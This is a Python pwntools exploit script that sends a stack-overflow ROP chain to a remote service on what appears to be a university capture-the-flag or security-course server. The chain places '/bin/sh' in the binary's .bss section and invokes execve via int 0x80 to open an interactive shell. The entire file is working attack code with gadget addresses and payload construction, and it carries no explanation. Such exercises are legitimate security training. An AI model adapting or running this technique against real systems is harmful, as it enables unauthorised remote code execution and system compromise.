from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

# P = process('./bin')
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10105)

elf = ELF("./bin")

# addrsSystem = elf.symbols['system']
# print(f"addrsSystem: {hex(addrsSystem)}")

bssSection = elf.get_section_by_name('.bss').header.sh_addr

sBuffer = 0xffffcd60
sRip = 0xffffcdec
offset = sRip - sBuffer

storage = 0x80ebfa0
fgets = 0x804f5e0

welcome = 0x8048a12

stdin = 0x80eb4bc
# addrsShell = elf.search('/bin/sh').__next__()

# 0x0808afba : push ebx ; ret
pushEbx = 0x080e3719
#0x080481d1 : pop ebx ; ret
popEbx = 0x080481d1

# 0x080701ca : pop edx ; ret
popEdx = 0x080701ca

# 0x0804c64d : pop eax ; ret
popEax = 0x0804c64d

# 0x080e6656 : add ebx, dword ptr [ecx + 0xa] ; ret
addEbxDwordPtrEcxa = 0x080e6656

# 0x080701f1 : pop ecx ; pop ebx ; ret
popEcxPopEbx = 0x080701f1

binSh1 = b"/bin"
binSh2 = b"/sh\x00"

# 0x08055bcb : mov dword ptr [edx], eax ; ret
movEdxEax = 0x08055bcb

# 0x0806dda5 : int 0x80
int80 = 0x0806dda5

payload = b"A"*offset #+ p32(popEcxPopEbx - 0xa) + p32(stdin) + p32(0) + p32(addEbxDwordPtrEcxa) + p32(pushEbx)
payload += p32(popEdx) + p32(bssSection) + p32(popEax) + binSh1 + p32(movEdxEax)
payload += p32(popEdx) + p32(bssSection + 4) + p32(popEax) + binSh2 + p32(movEdxEax)
payload += p32(popEax) + p32(0xb) + p32(popEcxPopEbx) + p32(0) + p32(bssSection) + p32(popEdx) + p32(0)
payload += p32(int80)

P.sendline(payload)
P.interactive()